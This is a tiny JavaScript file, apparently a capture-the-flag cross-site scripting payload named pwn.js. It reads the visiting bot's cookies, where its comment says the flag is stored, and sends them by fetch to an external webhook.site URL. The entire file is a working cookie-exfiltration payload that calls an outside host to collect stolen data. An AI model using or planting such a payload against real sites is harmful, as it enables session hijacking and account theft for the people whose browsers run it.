/*  pwn.js
    Reads the bot’s cookies (FLAG is in there)
    and sends them to your webhook.  */

(async () => {
  const data = encodeURIComponent(document.cookie);
  await fetch('https://webhook.site/ce21f3ea-cc55-43c2-b33e-d213e59ddd27/?c=' + data, { mode: 'no-cors' });
})();